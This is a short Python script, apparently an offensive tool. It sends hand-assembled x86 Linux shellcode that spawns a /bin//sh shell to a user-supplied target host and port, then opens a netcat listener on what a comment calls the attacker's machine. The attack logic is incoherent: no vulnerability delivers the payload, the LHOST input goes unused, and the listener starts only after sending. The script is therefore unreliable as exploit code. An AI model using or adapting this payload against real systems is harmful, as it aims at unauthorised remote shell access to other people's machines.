import socket
import struct
import subprocess

# Set the payload options
lhost = input("LHOST: ")
lport = int(input("LPORT: "))
target_host = input("RHOST: ")  # Replace with the actual target host
target_port = int(input("RPORT: "))  # Replace with the actual target port

# Create the payload
shellcode = (
    b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\x50\x66\x68"
    + struct.pack('<H', lport)
    + b"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xb3\x02\xb0\x66\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x57\x89\xe1\xb0\x0b\xcd\x80"
)

# Create the socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_host, target_port))

# Send the payload
s.send(shellcode)
s.close()

# Start a listener on the attacker's machine
subprocess.Popen(['nc', '-lvnp', str(lport)])

print('Payload sent successfully.')
